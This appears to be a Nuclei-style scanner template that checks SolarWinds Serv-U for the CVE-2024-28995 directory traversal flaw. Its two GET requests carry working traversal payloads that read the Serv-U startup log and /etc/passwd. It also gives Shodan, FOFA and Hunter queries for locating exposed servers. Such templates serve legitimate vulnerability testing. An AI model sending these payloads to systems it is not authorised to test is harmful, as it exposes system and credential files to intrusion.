id: CVE-2024-28995

info:
  name: SolarWinds Directory Traversal Vulnerability Check
  author: Selvaganesh S
  severity: high
  description: SolarWinds Serv-U was susceptible to a directory transversal vulnerability that would allow access to read sensitive files on the host machine.
  
  reference: 
    - https://attackerkb.com/topics/2k7UrkHyl3/cve-2024-28995/rapid7-analysis#/
    - https://www.solarwinds.com/trust-center/security-advisories/cve-2024-28995
    
  classification: 
    cvss-metrics:  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: 2024-28995
    cwe-id: CWE-22 
    
  metadata:
    verified: true
    max-request: 1
    Hunter: protocol.banner="Serv-U FTP"
    FOFA: app="SolarWinds-Serv-U-FTP"
    SHODAN: product:"Serv-U ftpd"

http:
  - method: GET
    path:
      - "{{Hostname}}/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/^&InternalFile=Serv-U-StartupLog.txt"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Serv-U File Server"
          - "SolarWinds"  

  - method: GET
    path:
      - "{{Hostname}}/?InternalDir=/../../etc&InternalFile=passwd"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root"
